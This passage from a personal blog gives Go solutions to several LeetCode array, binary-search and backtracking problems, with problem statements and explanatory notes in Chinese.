class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">removeElement</span><span class="params">(nums []<span class="keyword">int</span>, val <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">sort.Ints(nums)</span><br><span class="line">start := <span class="number">0</span></span><br><span class="line">end := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(nums); i++ &#123;</span><br><span class="line"><span class="keyword">if</span> nums[i] == val &#123;</span><br><span class="line">start = i</span><br><span class="line">i++</span><br><span class="line"><span class="keyword">for</span> i &lt; <span class="built_in">len</span>(nums) &amp;&amp; nums[i] == val &#123;</span><br><span class="line">i++</span><br><span class="line">&#125;</span><br><span class="line">end = i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    time.Sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">len</span> := <span class="built_in">len</span>(nums) - (end - start)</span><br><span class="line">nums = <span class="built_in">append</span>(nums[:start], nums[end:]...)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">len</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note-7"><a href="#Note-7" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p>………看不到用什么好方法，直接剔除重复部分，再把重复部分的两边粘起来:pensive:</p></blockquote><h2 id="33-Search-in-Rotated-Sorted-Array"><a href="#33-Search-in-Rotated-Sorted-Array" class="headerlink" title="33. Search in Rotated Sorted Array"></a>33. Search in Rotated Sorted Array</h2><p>You are given an integer array <code>nums</code> sorted in ascending order, and an integer <code>target</code>.</p><p>Suppose that <code>nums</code> is rotated at some pivot unknown to you beforehand (i.e., <code>[0,1,2,4,5,6,7]</code> might become <code>[4,5,6,7,0,1,2]</code>).</p><p><em>If <code>target</code> is found in the array return its index, otherwise, return <code>-1</code>.</em></p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [4,5,6,7,0,1,2], target &#x3D; 0</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [4,5,6,7,0,1,2], target &#x3D; 3</span><br><span class="line">Output: -1</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [1], target &#x3D; 0</span><br><span class="line">Output: -1</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>1 &lt;= nums.length &lt;= 5000</code></li><li><code>-10^4 &lt;= nums[i] &lt;= 10^4</code></li><li>All values of <code>nums</code> are <strong>unique</strong>.</li><li><code>nums</code> is guranteed to be rotated at some pivot.</li><li><code>-10^4 &lt;= target &lt;= 10^4</code></li></ul><h3 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">search</span><span class="params">(nums []<span class="keyword">int</span>, target <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line">left := <span class="number">0</span></span><br><span class="line">right := <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> left &lt;= right &#123;</span><br><span class="line">mid := (right + left) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> nums[mid] == target &#123;</span><br><span class="line"><span class="keyword">return</span> mid</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> nums[mid] &gt;= nums[left] &#123; <span class="comment">//left is sorted</span></span><br><span class="line"><span class="keyword">if</span> target &gt; nums[mid] || target &lt; nums[left] &#123;</span><br><span class="line">left = mid + <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">right = mid - <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">//right is sorted</span></span><br><span class="line"><span class="keyword">if</span> target &lt; nums[mid] || target &gt; nums[right] &#123;</span><br><span class="line">right = mid - <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">left = mid + <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note-8"><a href="#Note-8" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p>由于数组无论怎么打乱也是有序的，所以需要判断当前中点是否可能出在一个有序的半边，判断出哪个半边有序，随后再用<code>target</code>对其进行判断，再决定左右指针的移动。</p></blockquote><h2 id="34-Find-First-and-Last-Position-of-Element-in-Sorted-Array"><a href="#34-Find-First-and-Last-Position-of-Element-in-Sorted-Array" class="headerlink" title="34. Find First and Last Position of Element in Sorted Array"></a>34. Find First and Last Position of Element in Sorted Array</h2><p>Given an array of integers <code>nums</code> sorted in ascending order, find the starting and ending position of a given <code>target</code> value.</p><p>If <code>target</code> is not found in the array, return <code>[-1, -1]</code>.</p><p><strong>Follow up:</strong> Could you write an algorithm with <code>O(log n)</code> runtime complexity?</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [5,7,7,8,8,10], target &#x3D; 8</span><br><span class="line">Output: [3,4]</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [5,7,7,8,8,10], target &#x3D; 6</span><br><span class="line">Output: [-1,-1]</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [], target &#x3D; 0</span><br><span class="line">Output: [-1,-1</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>0 &lt;= nums.length &lt;= 105</code></li><li><code>-109 &lt;= nums[i] &lt;= 109</code></li><li><code>nums</code> is a non-decreasing array.</li><li><code>-109 &lt;= target &lt;= 109</code></li></ul><h3 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">searchRange</span><span class="params">(nums []<span class="keyword">int</span>, target <span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> []<span class="keyword">int</span>&#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">left := <span class="number">0</span></span><br><span class="line">right := <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">mid := (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">start := <span class="number">-1</span></span><br><span class="line">end := <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> left &lt;= right &#123;</span><br><span class="line">mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> nums[mid] == target &#123;</span><br><span class="line">start = mid</span><br><span class="line">end = mid</span><br><span class="line"><span class="keyword">for</span> start &gt;= <span class="number">1</span> &amp;&amp; nums[start<span class="number">-1</span>] == target &#123;</span><br><span class="line">start--</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> end &lt; <span class="built_in">len</span>(nums)<span class="number">-1</span> &amp;&amp; nums[end+<span class="number">1</span>] == target &#123;</span><br><span class="line">end++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> []<span class="keyword">int</span>&#123;start, end&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> nums[mid] &gt; target &#123;</span><br><span class="line">right = mid - <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">left = mid + <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> []<span class="keyword">int</span>&#123;start, end&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note-9"><a href="#Note-9" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p>没有什么有趣的方法，采用<strong>binary search</strong>进行搜索，只要一找到目标值，就以当前坐标为起点，利用左右指针开始移动，探求出左右边界值，得出结果</p></blockquote><h2 id="35-Search-Insert-Position"><a href="#35-Search-Insert-Position" class="headerlink" title="35. Search Insert Position"></a>35. Search Insert Position</h2><p>Given a sorted array of distinct integers and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [1,3,5,6], target &#x3D; 5</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [1,3,5,6], target &#x3D; 0</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums &#x3D; [1], target &#x3D; 0</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>1 &lt;= nums.length &lt;= 104</code></li><li><code>-104 &lt;= nums[i] &lt;= 104</code></li><li><code>nums</code> contains <strong>distinct</strong> values sorted in <strong>ascending</strong> order.</li><li><code>-104 &lt;= target &lt;= 104</code></li></ul><h3 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">searchInsert</span><span class="params">(nums []<span class="keyword">int</span>, target <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">l, r := <span class="number">0</span>, <span class="built_in">len</span>(nums)<span class="number">-1</span></span><br><span class="line">mid := (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> l &lt;= r &#123;</span><br><span class="line">mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> nums[mid] == target &#123;</span><br><span class="line"><span class="keyword">return</span> mid</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> nums[mid] &lt; target &#123;</span><br><span class="line">l = mid + <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r = mid - <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> nums[mid] &lt; target &#123;</span><br><span class="line"><span class="keyword">return</span> mid + <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> mid</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note-10"><a href="#Note-10" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p>采用<strong>binary search</strong>进行搜索，找到就返回，没找到判断一下插入位置</p></blockquote><h2 id="39-Combination-Sum"><a href="#39-Combination-Sum" class="headerlink" title="39. Combination Sum"></a>39. Combination Sum</h2><p>Given an array of <strong>distinct</strong> integers <code>candidates</code> and a target integer <code>target</code>, return <em>a list of all <strong>unique combinations</strong> of</em> <code>candidates</code> <em>where the chosen numbers sum to</em> <code>target</code><em>.</em> You may return the combinations in <strong>any order</strong>.</p><p>The <strong>same</strong> number may be chosen from <code>candidates</code> an <strong>unlimited number of times</strong>. Two combinations are unique if the frequency of at least one of the chosen numbers is different.</p><p>It is <strong>guaranteed</strong> that the number of unique combinations that sum up to <code>target</code> is less than <code>150</code> combinations for the given input.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: candidates &#x3D; [2,3,5], target &#x3D; 8</span><br><span class="line">Output: [[2,2,2,2],[2,3,3],[3,5]]</span><br></pre></td></tr></table></figure><h3 id="Solution-11"><a href="#Solution-11" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">combinationSum</span><span class="params">(candidates []<span class="keyword">int</span>, target <span class="keyword">int</span>)</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line"><span class="comment">//var res [][]int</span></span><br><span class="line">res := <span class="built_in">make</span>([][]<span class="keyword">int</span>, <span class="number">0</span>)</span><br><span class="line">comb := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(candidates) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line">backTrace(candidates, <span class="number">0</span>, target, <span class="number">0</span>, comb, &amp;res)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">backTrace</span><span class="params">(candidates []<span class="keyword">int</span>, startIndex <span class="keyword">int</span>, target <span class="keyword">int</span>, count <span class="keyword">int</span>, comb []<span class="keyword">int</span>, res *[][]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> count == target &#123; <span class="comment">// each candidate &gt; 1, omitting the situation of 0</span></span><br><span class="line">temp := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="built_in">len</span>(comb))</span><br><span class="line"><span class="built_in">copy</span>(temp, comb)</span><br><span class="line">*res = <span class="built_in">append</span>(*res, temp)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i := startIndex; i &lt; <span class="built_in">len</span>(candidates) &amp;&amp; count &lt; target; i++ &#123;</span><br><span class="line">count += candidates[i]</span><br><span class="line">comb = <span class="built_in">append</span>(comb, candidates[i])</span><br><span class="line">backTrace(candidates, i, target, count, comb, res)</span><br><span class="line">count -= candidates[i]</span><br><span class="line">comb = comb[:<span class="built_in">len</span>(comb)<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note-11"><a href="#Note-11" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p><code>back-tracing</code>方法，一件件拿，一件件放回，一开始觉得像是完全背包，后来又觉得不太对劲。另外注意<code>golang</code>里的append和传参指针操作</p></blockquote><h2 id="40-Combination-Sum-II"><a href="#40-Combination-Sum-II" class="headerlink" title="40. Combination Sum II"></a>40. Combination Sum II</h2><p>Given a collection of candidate numbers (<code>candidates</code>) and a target number (<code>target</code>), find all unique combinations in <code>candidates</code> where the candidate numbers sum to <code>target</code>.</p><p>Each number in <code>candidates</code> may only be used <strong>once</strong> in the combination.</p><p><strong>Note:</strong> The solution set must not contain duplicate combinations.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: candidates &#x3D; [2,5,2,1,2], target &#x3D; 5</span><br><span class="line">Output: </span><br><span class="line">[</span><br><span class="line">[1,2,2],</span><br><span class="line">[5]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="Solution-12"><a href="#Solution-12" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">combinationSum2</span><span class="params">(candidates []<span class="keyword">int</span>, target <span class="keyword">int</span>)</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line"><span class="comment">//var res [][]int</span></span><br><span class="line">sort.Ints(candidates)</span><br><span class="line">res := <span class="built_in">make</span>([][]<span class="keyword">int</span>, <span class="number">0</span>)</span><br><span class="line">comb := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(candidates) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line">backTrace(candidates, <span class="number">0</span>, target, <span class="number">0</span>, comb, &amp;res)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">backTrace</span><span class="params">(candidates []<span class="keyword">int</span>, startIndex <span class="keyword">int</span>, target <span class="keyword">int</span>, count <span class="keyword">int</span>, comb []<span class="keyword">int</span>, res *[][]<span class="keyword">int</span>, )</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> count == target &#123; <span class="comment">// each candidate &gt; 1, omitting the situation of 0</span></span><br><span class="line">temp := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="built_in">len</span>(comb))</span><br><span class="line"><span class="built_in">copy</span>(temp, comb)</span><br><span class="line">*res = <span class="built_in">append</span>(*res, temp)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i := startIndex; i &lt; <span class="built_in">len</span>(candidates) &amp;&amp; count &lt; target; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> i == startIndex || candidates[i] != candidates[i<span class="number">-1</span>] &#123;</span><br><span class="line">count += candidates[i]</span><br><span class="line">comb = <span class="built_in">append</span>(comb, candidates[i])</span><br><span class="line">backTrace(candidates, i+<span class="number">1</span>, target, count, comb, res)</span><br><span class="line">count -= candidates[i]</span><br><span class="line">comb = comb[:<span class="built_in">len</span>(comb)<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note-12"><a href="#Note-12" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p><code>back-tracing</code>方法。但是每个<code>candidate</code>不是无限制取用了，所以跟上一题相比，每次recursive都要+1；另外，题目注明不得有重复结果，所以需要在操作时给出合适的判断条件，剔除重复值。</p><ul><li><p>首先保证重复值相互邻近，方便判断，所以需要extra overhead去排序</p></li><li><p>使用排序后的<code>Int[]</code>去做类似的上题的操作，但是需要这么一条语句去判断<code>if i == startIndex || candidates[i] != candidates[i-1]</code></p><p>该条语句可以这样理解，可以把<code>i == startIndex</code>的情况想成本轮起点的第一次，也即是之前组合与本轮第一个数字所形成的的组合，是第一次形成的组合，需要保证。而重复值的剔除则需要<code>candidates[i] != candidates[i-1]</code>。举例，<code>candidates=[1,2,2,2,5]</code>，<code>target=5</code>。开始时以数字1作为起点开始for循环，首先判断了<code>i == startIndex</code>，随后开始放入1，开始下一个递归，到了数字2，2此时也符合条件，进入到下一个2，这个时候结果满足了<code>target</code>，开始放入结果集，此时<code>count</code>已经不满足小于<code>target</code>,所以本次第二个2开始的递归结束了，回到上一个2，此时comb里面是<code>[1,2]</code>，继续向后遍历，此时第二个2和第三个2由于<code>candidates[i] != candidates[i-1]</code>的限制，都被剔除了。也即是，如果现在已有1,2，那么距离<code>target</code>只有一个2的差距，那么根据递归的特性，本轮肯定是在满足了<code>target</code>而又返回到这里的，所以如果满足的时候使用的是第二个2，那么回到这一轮的时候，第二个2以及后面重复的2都不应该在作为新的结果放入结果集中。</p></li><li><p>我一开始的判断语句武断地写为<code>if i&gt;0 &amp;&amp; candidates[i] != candidates[i-1]</code>,导致结果错误。如果使用这条错误语句，那么上面例子中的<code>[1,2,2]</code>就不会出现，这是因为2,2就会重复。所以<code>i == startIndex</code>很好的保证了某轮<code>for</code>循环的第一个数字一定是可以被拿入来做进行组合的，在满足条件之后递归回到上一轮的时候，此时就不需要重复值了，因为如果是需要多个重复的x值去满足一个<code>target</code>，那么最深处的某一轮一定是完全拿到了自己想要组合，余下的x只是重复的多余选择而已，不再需要。<code>candidates[i] != candidates[i-1]</code>也就在此时发挥作用。</p></li></ul></blockquote><h2 id="42-Trapping-Rain-Water"><a href="#42-Trapping-Rain-Water" class="headerlink" title="42. Trapping Rain Water"></a>42. Trapping Rain Water</h2><p>Given <code>n</code> non-negative integers representing an elevation map where the width of each bar is <code>1</code>, compute how much water it can trap after raining.</p><p><strong>Example 1:</strong></p><p><img src="https://assets.leetcode.com/uploads/2018/10/22/rainwatertrap.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: height &#x3D; [0,1,0,2,1,0,1,3,2,1,2,1]</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: The above elevation map (black section) is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: height &#x3D; [4,2,0,3,2,5]</span><br><span class="line">Output: 9</span><br></pre></td></tr></table></figure><p><strong>Constraints:</strong></p><ul><li><code>n == height.length</code></li><li><code>0 &lt;= n &lt;= 3 * 104</code></li><li><code>0 &lt;= height[i] &lt;= 105</code></li></ul><h3 id="Solution-13"><a href="#Solution-13" class="headerlink" title="Solution:"></a>Solution:</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">trap</span><span class="params">(height []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">l, r, curHigh, curLow := <span class="number">0</span>, <span class="built_in">len</span>(height)<span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">trappedWater := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> l &lt; r &#123;</span><br><span class="line"><span class="keyword">if</span> height[l] &lt; height[r] &#123;</span><br><span class="line">curLow = height[l]</span><br><span class="line">l++</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">curLow = height[r]</span><br><span class="line">r--</span><br><span class="line">&#125;</span><br><span class="line">curHigh = max(curHigh, curLow)</span><br><span class="line">trappedWater += curHigh - curLow</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> trappedWater</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a <span class="keyword">int</span>, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> a &gt; b &#123;</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Note-13"><a href="#Note-13" class="headerlink" title="Note:"></a>Note:</h3><blockquote><p>受到<a href="https://leetcode.com/problems/trapping-rain-water/discuss/17364/7-lines-C-C%2B%2B" target="_blank" rel="noopener">LeetCode Discuss</a>的教导，在上面贴上这种很巧妙地解题代码</p><p><code>curHigh</code>：当前的可行蓄水高度</p><p><code>curLow</code>：当前最低处高度</p><p><em>注意图上的y轴是无法作为墙的,所以[0,1….]这里没有办法蓄积到水</em></p><p>思路如下，左右各有一个指针。根据题目描述，囤积的雨水数量一定与最低的一边有关，所以开始遍历时，先判断左右两边指针所指向的的高度孰高孰低。用以下数据为例[9, 8, 2, 6],一开始指针指向9和6,此时6比9小，6就赋给了<code>curHigh</code>和<code>curLow</code>，此时<code>curHigh</code>可以安全地置为6，这是因为6属于小的一方，以6为最大高度囤积雨水，另一侧一定有一个更高的高度来兜底，导致雨水可以被囤积；r指针随后移动到了数字2，2与9比较，还是2小，所以2现在是整个数组中的最低洼，<code>curLow=2</code>，而当前<code>curHigh=6</code>，所以此时的水囤积为4，这里只考虑当前低洼处单体所可以积蓄的水量，而不用考虑两边的延伸。当r继续移动后，值8就要比当前的<code>curHigh</code>要大了，所以需要进行一次数值更新，而由于更新后l已经等于了r，本次计算就结束了。</p><p>再以[2, 1, 5, 4, 1, 3]为例，一开始左右比较，值2比4小，从左指针向右靠拢，2变成最高处与最低处，l指针移动到1，1与2形成的积水量为1，总量加1，再继续移动到值5，5比3要大，此时也就代表以2为左起点的蓄水面积已经到头了，也即高度为2的蓄水部分此时已经无法漫过当前的l指针指向的高度。所以实际上此时的左起点高度变为5，需要从右指针开始向左靠拢。当前可蓄水高度变为3，低洼处也被置为3；进入下一轮，l处值还是比r处大，<code>curLow</code>被置为1，此时高度1与高度3形成了单位2的蓄水量，总量再加2；最后一轮，r指针指向4，4依旧小于5，4重新被置为最低处值，从代码上来考虑，<code>curHigh = max(curHigh, 